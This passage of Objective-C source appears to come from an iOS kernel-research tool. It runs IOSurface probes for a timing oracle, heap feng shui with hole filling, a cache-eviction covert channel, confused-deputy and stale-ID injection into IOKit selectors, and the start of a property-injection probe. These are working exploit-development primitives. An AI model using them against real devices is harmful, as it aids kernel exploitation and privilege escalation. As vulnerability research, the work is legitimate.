                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }
            log(@"TIMING: Starting kernel timing oracle");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            mach_timebase_info_data_t timebase;
            mach_timebase_info(&timebase);

            // Phase A: Create/destroy timing by surface size
            log(@"TIMING: Phase A — create/destroy timing by size");
            {
                size_t sizes[] = {1, 4, 16, 64, 256, 1024};
                size_t numSizes = sizeof(sizes) / sizeof(sizes[0]);
                uint64_t medianCreateNs[6] = {0};

                for (size_t si = 0; si < numSizes && !isr_stopped(); si++) {
                    size_t w = sizes[si];
                    size_t h = (w < 4) ? 256 : 64;
                    NSDictionary *params = isr_default_surface_params(w, h);
                    CFDictionaryRef cfParams = (__bridge CFDictionaryRef)params;

                    uint32_t trials = 30;
                    uint64_t createTimes[30];
                    uint64_t destroyTimes[30];

                    for (uint32_t t = 0; t < trials && !isr_stopped(); t++) {
                        uint64_t t0 = mach_absolute_time();
                        IOSurfaceRef s = sym.create(cfParams);
                        uint64_t t1 = mach_absolute_time();
                        if (s) CFRelease(s);
                        uint64_t t2 = mach_absolute_time();
                        createTimes[t]  = (t1 - t0) * timebase.numer / timebase.denom;
                        destroyTimes[t] = (t2 - t1) * timebase.numer / timebase.denom;
                    }

                    qsort(createTimes, trials, sizeof(uint64_t), isr_compare_uint64);
                    qsort(destroyTimes, trials, sizeof(uint64_t), isr_compare_uint64);

                    uint64_t medCreate  = createTimes[trials / 2];
                    uint64_t medDestroy = destroyTimes[trials / 2];
                    medianCreateNs[si] = medCreate;

                    log([NSString stringWithFormat:
                        @"TIMING: size=%zux%zu create_med=%lluns destroy_med=%lluns",
                        w, h, medCreate, medDestroy]);
                }

                if (numSizes >= 3 && medianCreateNs[0] > 0) {
                    double ratio_small = (double)medianCreateNs[numSizes/2] / (double)medianCreateNs[0];
                    double ratio_large = (double)medianCreateNs[numSizes-1] / (double)medianCreateNs[numSizes/2];
                    if (ratio_large > ratio_small * 3.0) {
                        anomalies++;
                        log(@"TIMING: ANOMALY — non-linear create scaling reveals allocator behavior");
                    }
                    log([NSString stringWithFormat:
                        @"TIMING: Scaling — small/mid=%.2fx mid/large=%.2fx",
                        ratio_small, ratio_large]);
                }
            }

            if (isr_stopped()) goto timing_done;

            // Phase B: Lock/unlock timing variance
            log(@"TIMING: Phase B — lock/unlock timing analysis");
            {
                NSDictionary *params = isr_default_surface_params(256, 256);
                CFDictionaryRef cfParams = (__bridge CFDictionaryRef)params;
                IOSurfaceRef surf = sym.create(cfParams);
                if (surf) {
                    uint32_t trials = 40;
                    uint64_t lockTimes[40];
                    uint64_t unlockTimes[40];

                    for (uint32_t t = 0; t < trials && !isr_stopped(); t++) {
                        uint64_t t0 = mach_absolute_time();
                        sym.lock(surf, 0, NULL);
                        uint64_t t1 = mach_absolute_time();
                        void *base = sym.getBase(surf);
                        if (base) {
                            volatile uint8_t x = ((uint8_t *)base)[0];
                            (void)x;
                        }
                        uint64_t t2 = mach_absolute_time();
                        sym.unlock(surf, 0, NULL);
                        uint64_t t3 = mach_absolute_time();
                        (void)t2;

                        lockTimes[t]   = (t1 - t0) * timebase.numer / timebase.denom;
                        unlockTimes[t] = (t3 - t2) * timebase.numer / timebase.denom;
                    }

                    qsort(lockTimes, trials, sizeof(uint64_t), isr_compare_uint64);
                    qsort(unlockTimes, trials, sizeof(uint64_t), isr_compare_uint64);
                    uint64_t medLock   = lockTimes[trials / 2];
                    uint64_t medUnlock = unlockTimes[trials / 2];
                    uint64_t maxLock   = lockTimes[trials - 1];
                    uint64_t maxUnlock = unlockTimes[trials - 1];

                    log([NSString stringWithFormat:
                        @"TIMING: lock med=%lluns max=%lluns  unlock med=%lluns max=%lluns",
                        medLock, maxLock, medUnlock, maxUnlock]);

                    if (medLock > 0 && maxLock > medLock * 3) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"TIMING: ANOMALY — lock outlier %lluns vs median %lluns (cache leak)",
                            maxLock, medLock]);
                    }
                    if (medUnlock > 0 && maxUnlock > medUnlock * 3) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"TIMING: ANOMALY — unlock outlier %lluns vs median %lluns",
                            maxUnlock, medUnlock]);
                    }

                    CFRelease(surf);
                }
            }

            if (isr_stopped()) goto timing_done;

            // Phase C: IOConnectCallMethod selector timing on IOSurfaceRoot
            log(@"TIMING: Phase C — selector timing on IOSurfaceRoot");
            {
                CFMutableDictionaryRef matchDict = sym.matching("IOSurfaceRoot");
                if (matchDict) {
                    io_service_t svc = sym.getMatch(MACH_PORT_NULL, matchDict);
                    if (svc) {
                        io_connect_t conn = 0;
                        kern_return_t kr = sym.open(svc, mach_task_self(), 0, &conn);
                        if (kr == KERN_SUCCESS && conn) {
                            uint32_t selectorCount = 32;
                            uint32_t trials = 20;
                            uint64_t selectorMedians[32];
                            uint32_t timingAnomalies = 0;

                            for (uint32_t sel = 0; sel < selectorCount && !isr_stopped(); sel++) {
                                uint64_t times[20];
                                for (uint32_t t = 0; t < trials; t++) {
                                    uint64_t scalarOut[2] = {0};
                                    uint32_t outCnt = 2;
                                    uint64_t t0 = mach_absolute_time();
                                    sym.call(conn, sel, NULL, 0, NULL, 0,
                                             scalarOut, &outCnt, NULL, NULL);
                                    uint64_t t1 = mach_absolute_time();
                                    times[t] = (t1 - t0) * timebase.numer / timebase.denom;
                                }
                                qsort(times, trials, sizeof(uint64_t), isr_compare_uint64);
                                selectorMedians[sel] = times[trials / 2];
                            }

                            uint64_t sorted[32];
                            memcpy(sorted, selectorMedians, selectorCount * sizeof(uint64_t));
                            qsort(sorted, selectorCount, sizeof(uint64_t), isr_compare_uint64);
                            uint64_t overallMedian = sorted[selectorCount / 2];

                            for (uint32_t sel = 0; sel < selectorCount && !isr_stopped(); sel++) {
                                if (overallMedian > 0 && selectorMedians[sel] > overallMedian * 3) {
                                    timingAnomalies++;
                                    log([NSString stringWithFormat:
                                        @"TIMING: Selector %u slow — %lluns vs median %lluns",
                                        sel, selectorMedians[sel], overallMedian]);
                                }
                            }

                            log([NSString stringWithFormat:
                                @"TIMING: Selectors — overallMedian=%lluns anomalies=%u/%u",
                                overallMedian, timingAnomalies, selectorCount]);

                            anomalies += timingAnomalies;
                            sym.close(conn);
                        }
                        sym.release(svc);
                    }
                }
            }

        timing_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"TIMING: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-TimingOracle-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 19: Heap Feng Shui

void iosurface_research_feng_shui(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"FENGSHUI: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"FENGSHUI: Starting heap feng shui analysis");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            // Phase A: Adjacent surface placement
            // Allocate surfaces of identical size, record addresses, verify they land adjacently
            log(@"FENGSHUI: Phase A — adjacent placement analysis");
            #define FS_COUNT 30
            #define FS_SIZE 256
            IOSurfaceRef surfs[FS_COUNT] = {0};
            uintptr_t addrs[FS_COUNT] = {0};
            size_t allocSizes[FS_COUNT] = {0};

            NSDictionary *params = isr_default_surface_params(FS_SIZE, FS_SIZE);
            for (int i = 0; i < FS_COUNT && !isr_stopped(); i++) {
                surfs[i] = sym.create((__bridge CFDictionaryRef)params);
                if (surfs[i]) {
                    sym.lock(surfs[i], 0, NULL);
                    addrs[i] = (uintptr_t)sym.getBase(surfs[i]);
                    allocSizes[i] = sym.getAllocSize(surfs[i]);
                    sym.unlock(surfs[i], 0, NULL);
                }
            }

            // Sort addresses to find adjacencies
            uintptr_t sorted[FS_COUNT];
            memcpy(sorted, addrs, sizeof(sorted));
            for (int i = 0; i < FS_COUNT - 1; i++) {
                for (int j = i + 1; j < FS_COUNT; j++) {
                    if (sorted[j] < sorted[i]) {
                        uintptr_t tmp = sorted[i];
                        sorted[i] = sorted[j];
                        sorted[j] = tmp;
                    }
                }
            }

            uint32_t adjacentPairs = 0;
            uint32_t gapCount = 0;
            size_t expectedAlloc = allocSizes[0];
            for (int i = 0; i < FS_COUNT - 1 && sorted[i] != 0; i++) {
                if (sorted[i + 1] == 0) break;
                size_t gap = sorted[i + 1] - sorted[i];
                if (gap == expectedAlloc) {
                    adjacentPairs++;
                } else if (gap < expectedAlloc * 2) {
                    gapCount++;
                }
            }

            log([NSString stringWithFormat:
                @"FENGSHUI: Adjacent pairs=%u/%d gaps=%u allocSize=%zu",
                adjacentPairs, FS_COUNT - 1, gapCount, expectedAlloc]);

            if (adjacentPairs > FS_COUNT / 2) {
                anomalies++;
                log(@"FENGSHUI: ANOMALY — high adjacency rate, predictable heap layout");
            }

            // Phase B: Targeted hole filling
            // Free every other surface, then reallocate with sentinel patterns
            log(@"FENGSHUI: Phase B — targeted hole filling");
            uint8_t sentinel_A = 0xAA;
            uint8_t sentinel_B = 0xBB;

            // Write sentinel_A to even surfaces
            for (int i = 0; i < FS_COUNT; i += 2) {
                if (surfs[i]) {
                    sym.lock(surfs[i], 0, NULL);
                    void *base = sym.getBase(surfs[i]);
                    if (base) memset(base, sentinel_A, 64);
                    sym.unlock(surfs[i], 0, NULL);
                }
            }

            // Free odd surfaces (create holes between sentineled surfaces)
            uintptr_t freedAddrs[FS_COUNT / 2];
            int freedCount = 0;
            for (int i = 1; i < FS_COUNT; i += 2) {
                if (surfs[i]) {
                    freedAddrs[freedCount++] = addrs[i];
                    CFRelease(surfs[i]);
                    surfs[i] = NULL;
                }
            }

            // Reallocate — try to land in freed holes with sentinel_B pattern
            IOSurfaceRef refills[FS_COUNT / 2];
            uint32_t holeHits = 0;
            for (int i = 0; i < freedCount && !isr_stopped(); i++) {
                refills[i] = sym.create((__bridge CFDictionaryRef)params);
                if (refills[i]) {
                    sym.lock(refills[i], 0, NULL);
                    uintptr_t newAddr = (uintptr_t)sym.getBase(refills[i]);
                    void *base = sym.getBase(refills[i]);
                    if (base) memset(base, sentinel_B, 64);
                    sym.unlock(refills[i], 0, NULL);
                    // Check if we landed in a freed slot
                    for (int j = 0; j < freedCount; j++) {
                        if (newAddr == freedAddrs[j]) {
                            holeHits++;
                            break;
                        }
                    }
                }
            }

            log([NSString stringWithFormat:
                @"FENGSHUI: Hole filling — freed=%d refilled=%d holeHits=%u (%.0f%%)",
                freedCount, freedCount, holeHits,
                freedCount > 0 ? (holeHits * 100.0 / freedCount) : 0.0]);

            if (holeHits > freedCount / 2) {
                anomalies++;
                log(@"FENGSHUI: ANOMALY — high hole-fill rate, deterministic placement");
            }

            // Phase C: Cross-boundary probe
            // Check if adjacent surfaces can observe each other's sentinel patterns
            // Read boundary bytes of even (sentinel_A) surfaces after filling holes with sentinel_B
            log(@"FENGSHUI: Phase C — cross-boundary probe");
            uint32_t boundaryLeaks = 0;

            for (int i = 0; i < FS_COUNT; i += 2) {
                if (!surfs[i] || isr_stopped()) continue;
                sym.lock(surfs[i], 0, NULL);
                void *base = sym.getBase(surfs[i]);
                size_t allocSz = sym.getAllocSize(surfs[i]);
                if (base && allocSz > 0) {
                    // Check the last page of the buffer for any sentinel_B contamination
                    uint8_t *end = (uint8_t *)base + allocSz - 64;
                    if ((uintptr_t)end > (uintptr_t)base) {
                        for (int b = 0; b < 64; b++) {
                            if (end[b] == sentinel_B) {
                                boundaryLeaks++;
                                log([NSString stringWithFormat:
                                    @"FENGSHUI: BOUNDARY LEAK at surface %d offset %zu+%d",
                                    i, allocSz - 64, b]);
                                break;
                            }
                        }
                    }
                }
                sym.unlock(surfs[i], 0, NULL);
            }

            if (boundaryLeaks > 0) {
                anomalies++;
                log([NSString stringWithFormat:
                    @"FENGSHUI: ANOMALY — %u cross-boundary leaks detected!", boundaryLeaks]);
            } else {
                log(@"FENGSHUI: No cross-boundary leaks — kernel enforces page isolation");
            }

            // Cleanup
            for (int i = 0; i < FS_COUNT; i++) {
                if (surfs[i]) CFRelease(surfs[i]);
            }
            for (int i = 0; i < freedCount; i++) {
                if (refills[i]) CFRelease(refills[i]);
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"FENGSHUI: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"adjacentPairs": @(adjacentPairs),
                @"holeHits": @(holeHits),
                @"boundaryLeaks": @(boundaryLeaks),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-FengShui-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 20: Cache Covert Channel

void iosurface_research_cache_channel(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"CACHE: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"CACHE: Starting cache covert channel analysis");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            mach_timebase_info_data_t tbi;
            mach_timebase_info(&tbi);

            // Phase A: Establish baseline lock/unlock timing
            log(@"CACHE: Phase A — baseline timing calibration");
            #define CC_SAMPLES 200
            #define CC_SURFACES 5

            NSDictionary *params = isr_default_surface_params(512, 512);
            IOSurfaceRef calibSurf = sym.create((__bridge CFDictionaryRef)params);
            if (!calibSurf) {
                log(@"CACHE: Failed to create calibration surface");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            uint64_t lockTimes[CC_SAMPLES];
            uint64_t unlockTimes[CC_SAMPLES];

            for (int i = 0; i < CC_SAMPLES && !isr_stopped(); i++) {
                uint64_t t0 = mach_absolute_time();
                sym.lock(calibSurf, 0, NULL);
                uint64_t t1 = mach_absolute_time();
                sym.unlock(calibSurf, 0, NULL);
                uint64_t t2 = mach_absolute_time();
                lockTimes[i] = (t1 - t0) * tbi.numer / tbi.denom;
                unlockTimes[i] = (t2 - t1) * tbi.numer / tbi.denom;
            }

            // Sort to get percentiles
            for (int i = 0; i < CC_SAMPLES - 1; i++)
                for (int j = i + 1; j < CC_SAMPLES; j++) {
                    if (lockTimes[j] < lockTimes[i]) {
                        uint64_t tmp = lockTimes[i]; lockTimes[i] = lockTimes[j]; lockTimes[j] = tmp;
                    }
                    if (unlockTimes[j] < unlockTimes[i]) {
                        uint64_t tmp = unlockTimes[i]; unlockTimes[i] = unlockTimes[j]; unlockTimes[j] = tmp;
                    }
                }

            uint64_t lockP50 = lockTimes[CC_SAMPLES / 2];
            uint64_t lockP95 = lockTimes[(int)(CC_SAMPLES * 0.95)];
            uint64_t lockP99 = lockTimes[(int)(CC_SAMPLES * 0.99)];
            uint64_t unlockP50 = unlockTimes[CC_SAMPLES / 2];
            uint64_t unlockP95 = unlockTimes[(int)(CC_SAMPLES * 0.95)];

            log([NSString stringWithFormat:
                @"CACHE: Lock p50=%lluns p95=%lluns p99=%lluns", lockP50, lockP95, lockP99]);
            log([NSString stringWithFormat:
                @"CACHE: Unlock p50=%lluns p95=%lluns", unlockP50, unlockP95]);

            // Phase B: Eviction-based signaling
            // Allocate many surfaces to evict cache, then measure timing difference
            log(@"CACHE: Phase B — cache eviction signaling");
            #define CC_EVICT 50

            IOSurfaceRef evictSurfs[CC_EVICT] = {0};
            NSDictionary *bigParams = isr_default_surface_params(1024, 1024);

            uint64_t postEvictLock[30];
            uint32_t bitsSent = 0;
            uint32_t bitsCorrect = 0;

            for (int trial = 0; trial < 30 && !isr_stopped(); trial++) {
                BOOL sendBit = (trial % 2 == 0); // alternating 1/0 pattern

                if (sendBit) {
                    // "Send 1" — evict cache by allocating/touching many surfaces
                    for (int i = 0; i < CC_EVICT; i++) {
                        evictSurfs[i] = sym.create((__bridge CFDictionaryRef)bigParams);
                        if (evictSurfs[i]) {
                            sym.lock(evictSurfs[i], 0, NULL);
                            void *base = sym.getBase(evictSurfs[i]);
                            if (base) memset(base, 0xFF, 4096); // touch pages
                            sym.unlock(evictSurfs[i], 0, NULL);
                        }
                    }
                }

                // "Receive" — measure lock timing on calibration surface
                uint64_t t0 = mach_absolute_time();
                sym.lock(calibSurf, 0, NULL);
                uint64_t t1 = mach_absolute_time();
                sym.unlock(calibSurf, 0, NULL);
                uint64_t elapsed_ns = (t1 - t0) * tbi.numer / tbi.denom;
                postEvictLock[trial] = elapsed_ns;

                // Decode: if timing > p95, interpret as "1" (cache evicted)
                BOOL receivedBit = (elapsed_ns > lockP95);
                bitsSent++;
                if (receivedBit == sendBit) bitsCorrect++;

                // Cleanup eviction surfaces
                if (sendBit) {
                    for (int i = 0; i < CC_EVICT; i++) {
                        if (evictSurfs[i]) { CFRelease(evictSurfs[i]); evictSurfs[i] = NULL; }
                    }
                }
            }

            double accuracy = bitsSent > 0 ? (bitsCorrect * 100.0 / bitsSent) : 0;
            log([NSString stringWithFormat:
                @"CACHE: Signaling — sent=%u correct=%u accuracy=%.1f%%",
                bitsSent, bitsCorrect, accuracy]);

            if (accuracy > 70.0) {
                anomalies++;
                log(@"CACHE: ANOMALY — cache covert channel viable (>70% accuracy)");
            }

            // Phase C: Timing histogram for bandwidth estimation
            log(@"CACHE: Phase C — timing distribution analysis");

            uint64_t coldTimes[20];
            uint64_t hotTimes[20];

            for (int i = 0; i < 20 && !isr_stopped(); i++) {
                // Hot: repeated lock/unlock (cached)
                sym.lock(calibSurf, 0, NULL);
                sym.unlock(calibSurf, 0, NULL);
                sym.lock(calibSurf, 0, NULL);
                sym.unlock(calibSurf, 0, NULL);
                uint64_t t0 = mach_absolute_time();
                sym.lock(calibSurf, 0, NULL);
                uint64_t t1 = mach_absolute_time();
                sym.unlock(calibSurf, 0, NULL);
                hotTimes[i] = (t1 - t0) * tbi.numer / tbi.denom;

                // Cold: evict then measure
                IOSurfaceRef trash[20];
                for (int j = 0; j < 20; j++) {
                    trash[j] = sym.create((__bridge CFDictionaryRef)bigParams);
                    if (trash[j]) {
                        sym.lock(trash[j], 0, NULL);
                        void *b = sym.getBase(trash[j]);
                        if (b) memset(b, 0, 4096);
                        sym.unlock(trash[j], 0, NULL);
                    }
                }
                t0 = mach_absolute_time();
                sym.lock(calibSurf, 0, NULL);
                t1 = mach_absolute_time();
                sym.unlock(calibSurf, 0, NULL);
                coldTimes[i] = (t1 - t0) * tbi.numer / tbi.denom;

                for (int j = 0; j < 20; j++) {
                    if (trash[j]) CFRelease(trash[j]);
                }
            }

            // Calculate medians
            for (int i = 0; i < 19; i++)
                for (int j = i + 1; j < 20; j++) {
                    if (hotTimes[j] < hotTimes[i]) { uint64_t t = hotTimes[i]; hotTimes[i] = hotTimes[j]; hotTimes[j] = t; }
                    if (coldTimes[j] < coldTimes[i]) { uint64_t t = coldTimes[i]; coldTimes[i] = coldTimes[j]; coldTimes[j] = t; }
                }

            uint64_t hotMed = hotTimes[10];
            uint64_t coldMed = coldTimes[10];
            double ratio = hotMed > 0 ? (double)coldMed / hotMed : 0;

            log([NSString stringWithFormat:
                @"CACHE: Hot median=%lluns Cold median=%lluns ratio=%.1fx",
                hotMed, coldMed, ratio]);

            if (ratio > 2.0) {
                anomalies++;
                log([NSString stringWithFormat:
                    @"CACHE: ANOMALY — %.1fx cold/hot ratio, reliable cache distinguisher", ratio]);
            }

            CFRelease(calibSurf);

            double elapsedTotal = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"CACHE: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsedTotal]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"accuracy": @(accuracy),
                @"coldHotRatio": @(ratio),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsedTotal)
            };
            isr_checkpoint(@"ISR-CacheChannel-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 21: Confused Deputy

void iosurface_research_confused_deputy(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"DEPUTY: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"DEPUTY: Starting confused deputy analysis");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            // Phase A: Pass IOSurface ID as scalar input to IOSurfaceRoot only
            // Other services (AVE2, AGX, GPU) can crash the process — skip them
            log(@"DEPUTY: Phase A — IOSurface ID injection into IOSurfaceRoot");

            NSDictionary *params = isr_default_surface_params(64, 64);
            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
            if (!surf) {
                log(@"DEPUTY: Failed to create surface");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            IOSurfaceID surfID = sym.getID(surf);
            sym.lock(surf, 0, NULL);
            void *base = sym.getBase(surf);
            if (base) {
                memset(base, 0xCC, 64 * 64 * 4);
            }
            sym.unlock(surf, 0, NULL);

            log([NSString stringWithFormat:@"DEPUTY: Test surface id=%u", surfID]);

            uint32_t servicesOpened = 0;
            uint32_t selectorsAccepted = 0;

            // Only test IOSurfaceRoot — safe, well-known service
            CFMutableDictionaryRef match = sym.matching("IOSurfaceRoot");
            if (match) {
                io_service_t svc = sym.getMatch(MACH_PORT_NULL, match);
                if (svc) {
                    io_connect_t conn = 0;
                    kern_return_t kr = sym.open(svc, mach_task_self(), 0, &conn);
                    if (kr == KERN_SUCCESS && conn) {
                        servicesOpened++;
                        uint64_t scalarIn[2] = { surfID, 0 };
                        uint64_t scalarOut[4] = {0};
                        uint32_t outCnt = 4;

                        for (uint32_t sel = 0; sel < 11 && !isr_stopped(); sel++) {
                            kr = sym.call(conn, sel, scalarIn, 2, NULL, 0,
                                          scalarOut, &outCnt, NULL, NULL);
                            if (kr == KERN_SUCCESS) {
                                selectorsAccepted++;
                                log([NSString stringWithFormat:
                                    @"DEPUTY: IOSurfaceRoot sel=%u ACCEPTED surfID — out=[%llu,%llu,%llu,%llu]",
                                    sel, scalarOut[0], scalarOut[1], scalarOut[2], scalarOut[3]]);
                            }
                            outCnt = 4;
                        }
                        sym.close(conn);
                    }
                    sym.release(svc);
                }
            }

            // Also test IOMobileFramebuffer type 0 only (known safe from Round 4)
            CFMutableDictionaryRef fbMatch = sym.matching("IOMobileFramebuffer");
            if (fbMatch) {
                io_service_t fbSvc = sym.getMatch(MACH_PORT_NULL, fbMatch);
                if (fbSvc) {
                    io_connect_t fbConn = 0;
                    kern_return_t kr = sym.open(fbSvc, mach_task_self(), 0, &fbConn);
                    if (kr == KERN_SUCCESS && fbConn) {
                        servicesOpened++;
                        uint64_t scalarIn[2] = { surfID, 0 };
                        uint64_t scalarOut[4] = {0};
                        uint32_t outCnt = 4;

                        for (uint32_t sel = 0; sel < 6 && !isr_stopped(); sel++) {
                            kr = sym.call(fbConn, sel, scalarIn, 2, NULL, 0,
                                          scalarOut, &outCnt, NULL, NULL);
                            if (kr == KERN_SUCCESS) {
                                selectorsAccepted++;
                                log([NSString stringWithFormat:
                                    @"DEPUTY: IOMobileFramebuffer sel=%u ACCEPTED surfID — out=[%llu,%llu,%llu,%llu]",
                                    sel, scalarOut[0], scalarOut[1], scalarOut[2], scalarOut[3]]);
                            }
                            outCnt = 4;
                        }
                        sym.close(fbConn);
                    }
                    sym.release(fbSvc);
                }
            }

            log([NSString stringWithFormat:
                @"DEPUTY: Phase A — opened=%u accepted=%u",
                servicesOpened, selectorsAccepted]);

            if (selectorsAccepted > 0) {
                anomalies++;
                log(@"DEPUTY: ANOMALY — services accepted surface ID as input");
            }

            // Phase B: Stale ID injection — destroy surface then pass old ID
            log(@"DEPUTY: Phase B — stale ID injection");
            IOSurfaceID staleID = surfID;
            CFRelease(surf);
            surf = NULL;

            IOSurfaceRef staleLookup = sym.lookup(staleID);
            if (staleLookup) {
                anomalies++;
                log([NSString stringWithFormat:
                    @"DEPUTY: ANOMALY — stale ID %u still resolves after destroy!", staleID]);
                CFRelease(staleLookup);
            } else {
                log([NSString stringWithFormat:
                    @"DEPUTY: Stale ID %u correctly invalidated", staleID]);
            }

            // Pass stale ID to IOSurfaceRoot only
            CFMutableDictionaryRef rootMatch = sym.matching("IOSurfaceRoot");
            if (rootMatch) {
                io_service_t rootSvc = sym.getMatch(MACH_PORT_NULL, rootMatch);
                if (rootSvc) {
                    io_connect_t rootConn = 0;
                    kern_return_t kr = sym.open(rootSvc, mach_task_self(), 0, &rootConn);
                    if (kr == KERN_SUCCESS && rootConn) {
                        uint64_t staleIn[2] = { staleID, 0 };
                        uint64_t out[4] = {0};
                        uint32_t outCnt = 4;

                        uint32_t staleAccepted = 0;
                        for (uint32_t sel = 0; sel < 11; sel++) {
                            kr = sym.call(rootConn, sel, staleIn, 2, NULL, 0,
                                          out, &outCnt, NULL, NULL);
                            if (kr == KERN_SUCCESS) {
                                staleAccepted++;
                                log([NSString stringWithFormat:
                                    @"DEPUTY: IOSurfaceRoot sel=%u ACCEPTED stale ID", sel]);
                            }
                            outCnt = 4;
                        }

                        if (staleAccepted > 0) {
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"DEPUTY: ANOMALY — %u selectors accepted stale surface ID", staleAccepted]);
                        }

                        sym.close(rootConn);
                    }
                    sym.release(rootSvc);
                }
            }

            // Phase C: Type confusion — pass surface ID as small struct input
            // Use only 16-byte struct to avoid triggering kernel panics
            log(@"DEPUTY: Phase C — type confusion via struct input");
            IOSurfaceRef confSurf = sym.create((__bridge CFDictionaryRef)
                isr_default_surface_params(128, 128));

            uint32_t structAccepted = 0;
            if (confSurf) {
                IOSurfaceID confID = sym.getID(confSurf);

                uint8_t structBuf[16];
                memset(structBuf, 0, sizeof(structBuf));
                memcpy(&structBuf[0], &confID, sizeof(confID));
                memcpy(&structBuf[4], &confID, sizeof(confID));

                CFMutableDictionaryRef m2 = sym.matching("IOSurfaceRoot");
                if (m2) {
                    io_service_t svc2 = sym.getMatch(MACH_PORT_NULL, m2);
                    if (svc2) {
                        io_connect_t conn2 = 0;
                        if (sym.open(svc2, mach_task_self(), 0, &conn2) == KERN_SUCCESS && conn2) {
                            for (uint32_t sel = 0; sel < 11 && !isr_stopped(); sel++) {
                                uint64_t out[4] = {0};
                                uint32_t outCnt = 4;
                                uint8_t outStruct[64] = {0};
                                size_t outStructSz = sizeof(outStruct);

                                kern_return_t kr = sym.call(conn2, sel,
                                    NULL, 0, structBuf, sizeof(structBuf),
                                    out, &outCnt, outStruct, &outStructSz);
                                if (kr == KERN_SUCCESS) {
                                    structAccepted++;
                                    log([NSString stringWithFormat:
                                        @"DEPUTY: IOSurfaceRoot sel=%u accepted struct with embedded surfID", sel]);
                                }
                            }
                            sym.close(conn2);
                        }
                        sym.release(svc2);
                    }
                }

                if (structAccepted > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"DEPUTY: ANOMALY — %u selectors accepted struct with surface ID", structAccepted]);
                }

                CFRelease(confSurf);
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"DEPUTY: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"servicesOpened": @(servicesOpened),
                @"selectorsAccepted": @(selectorsAccepted),
                @"structAccepted": @(structAccepted),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-ConfusedDeputy-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Round 7: Deep Kernel Attack Surface

// --- Probe 22: Property Injection ---

void iosurface_research_property_inject(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PROPINJECT: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef void (*ISR_SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*ISR_CopyValueFn)(IOSurfaceRef, CFStringRef);
            typedef void (*ISR_RemoveValueFn)(IOSurfaceRef, CFStringRef);
            typedef CFDictionaryRef (*ISR_CopyAllValuesFn)(IOSurfaceRef);

            ISR_SetValueFn setValue = (ISR_SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            ISR_CopyValueFn copyValue = (ISR_CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
            ISR_RemoveValueFn removeValue = (ISR_RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");
